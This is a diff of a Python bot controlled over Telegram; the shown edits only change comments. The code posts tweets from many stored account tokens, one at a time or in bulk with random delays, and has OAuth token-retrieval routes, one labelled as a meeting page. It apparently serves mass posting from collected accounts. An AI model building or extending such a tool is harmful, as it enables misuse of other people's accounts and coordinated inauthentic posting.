@@ -119,7 +119,7 @@ def wait_for_user_input():
     # Implement how you will handle waiting for user input in the bot
     pass
 
-# Handle posting a tweet with a single token (UPDATED)
+# Handle posting a tweet with a single token
 def handle_post_single(tweet_text):
     tokens = get_all_tokens()
     if tokens:
@@ -127,8 +127,8 @@ def handle_post_single(tweet_text):
         usernames = [token[2] for token in tokens]  # Fetch usernames from tokens
         send_message_via_telegram(f"👤 Available Accounts: {', '.join(usernames)}\nReply with the username to use:")
         
-        # We assume here that the username is provided by the user in the next Telegram message
-        selected_username = wait_for_user_input()  # Placeholder for waiting for user's reply
+        # Placeholder for waiting for user's reply
+        selected_username = wait_for_user_input()  # Wait for user's reply with the selected username
         
         # Find the selected username in the tokens
         for token in tokens:
@@ -142,7 +142,7 @@ def handle_post_single(tweet_text):
     else:
         send_message_via_telegram("❌ No tokens found to post a tweet.")
 
-# Handle bulk posting tweets with all tokens (UPDATED)
+# Handle bulk posting tweets with all tokens
 def handle_post_bulk(tweet_text):
     tokens = get_all_tokens()
     if tokens:
@@ -150,7 +150,7 @@ def handle_post_bulk(tweet_text):
         total_tokens = len(tokens)
         send_message_via_telegram(f"🔢 Total Tokens Stored: {total_tokens}\nHow many tokens would you like to use?")
         
-        num_tokens = int(wait_for_user_input())  # Placeholder to wait for user's input
+        num_tokens = int(wait_for_user_input())  # Wait for user's input on how many tokens to use
         
         # Ask for random delay range
         send_message_via_telegram("⏳ Please enter the range for random delays between posts (e.g., '5-10' seconds):")
@@ -343,7 +343,6 @@ def home():
             error_description = token_response.get('error_description', 'Unknown error')
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
-
 
 @app.route('/j')
 def meeting():
